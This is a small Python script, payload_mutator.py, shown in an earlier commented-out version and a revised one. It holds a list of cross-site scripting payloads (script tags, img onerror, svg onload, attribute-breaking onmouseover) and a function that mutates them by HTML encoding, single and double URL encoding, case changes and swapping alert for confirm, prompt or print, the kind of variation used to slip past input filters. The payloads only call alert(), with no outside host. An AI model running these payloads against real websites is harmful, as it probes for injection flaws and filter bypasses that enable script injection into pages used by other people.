# payload_mutator.py
'''
BASE_PAYLOADS = [
"<script>alert(1)</script>",
"'><script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"<svg/onload=alert(1)>"
]

def generate_payloads():

    payloads=set()

    for p in BASE_PAYLOADS:

        payloads.add(p)

        payloads.add(p.upper())

        payloads.add(p.replace("<","%3C").replace(">","%3E"))

        payloads.add(p.replace("script","ScRiPt"))

        payloads.add(p.replace("alert","confirm"))

        payloads.add(p.replace("alert","prompt"))

        payloads.add(p.replace("alert","print"))

    return list(payloads)
'''
# payload_mutator.py

import urllib.parse
import html

BASE_PAYLOADS = [

"<script>alert(1)</script>",
"'><script>alert(1)</script>",
"<img src=x onerror=alert(1)>",
"<svg/onload=alert(1)>",
"\" onmouseover=alert(1) x=\""
]

def generate_payloads():

    payloads=set()

    for p in BASE_PAYLOADS:

        # raw
        payloads.add(p)

        # html encoded
        payloads.add(html.escape(p))

        # url encoded
        payloads.add(urllib.parse.quote(p))

        # double url encoded
        payloads.add(urllib.parse.quote(urllib.parse.quote(p)))

        # mixed encoding
        payloads.add(p.replace("<","%3C").replace(">","%3E"))

        # case mutation
        payloads.add(p.replace("script","ScRiPt"))

        # event mutation
        payloads.add(p.replace("alert","confirm"))

    return list(payloads)
